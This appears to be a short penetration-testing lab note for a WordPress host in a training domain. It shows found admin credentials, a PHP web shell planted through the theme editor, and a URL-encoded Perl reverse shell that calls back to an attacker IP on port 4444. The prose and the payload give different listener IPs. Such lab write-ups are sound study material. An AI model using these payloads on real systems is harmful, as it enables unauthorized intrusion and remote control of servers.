- Credentials for `ilfreightwp:password1` has been found in `dmz01`
- after log in into wordpress the next file can be edited to add command execution
```
http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo
```
- the next code should be enough
```
<?php system($_REQUEST['cmd']); ?>
```
- so the next path can execute command
```
http://ir.inlanefreight.local/wp-content/themes/twentytwentytwo/index.php?cmd=pwd
```
- After that command to get reverse shell should be 10.10.15.188:4444
```
/wp-content/themes/twentytwentytwo/index.php?cmd=perl+-e+'use+Socket%3b$i%3d"10.10.14.196"%3b$p%3d4444%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("bash+-i")%3b}%3b'
```
- woala, I am in container!!!
